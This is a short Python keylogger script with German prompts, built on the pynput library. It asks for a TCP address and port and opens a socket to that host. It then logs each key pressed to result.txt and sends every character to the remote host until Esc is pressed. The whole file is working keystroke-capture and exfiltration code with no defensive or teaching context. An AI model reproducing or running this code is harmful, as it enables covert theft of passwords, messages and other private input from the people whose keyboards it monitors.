import pynput
from pynput.keyboard import Controller, Listener, Key
from pynput import keyboard
import time
import json
import socket

TCP_IP = input("Geben Sie Ihre TCP-IP-Adresse ein: ")
TCP_PORT = int(input("Geben Sie Ihre TCP-Portnummer ein: "))
BUFFER_SIZE = 1024
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

def key_monitor(key):
    try:
        with open("result.txt", "a") as f:
            f.write(key.char)
            s.send(key.char.encode())
    except AttributeError:
        pass


def typing(key):
    print('{0} losgelassen'.format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False


with keyboard.Listener(
    on_press=key_monitor,
    on_release=typing) as listener:
    try:
        listener.join()
    finally:
        s.close()
